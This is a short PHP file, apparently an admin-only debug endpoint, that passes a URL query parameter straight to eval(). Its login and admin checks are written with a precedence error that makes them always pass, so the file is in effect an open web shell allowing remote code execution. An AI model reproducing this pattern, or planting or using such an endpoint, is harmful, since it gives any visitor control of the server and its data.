<?php
require_once('../../debug.php');
require_once('../../internal/pureFetchLogin.php');
if (! $loggedin==='true'
		|| ! $login->getUser()->getClassName()==='Admin')
			exit();

header("Content-Type: text/html; charset=utf-8;");

eval(urldecode($_GET['code']));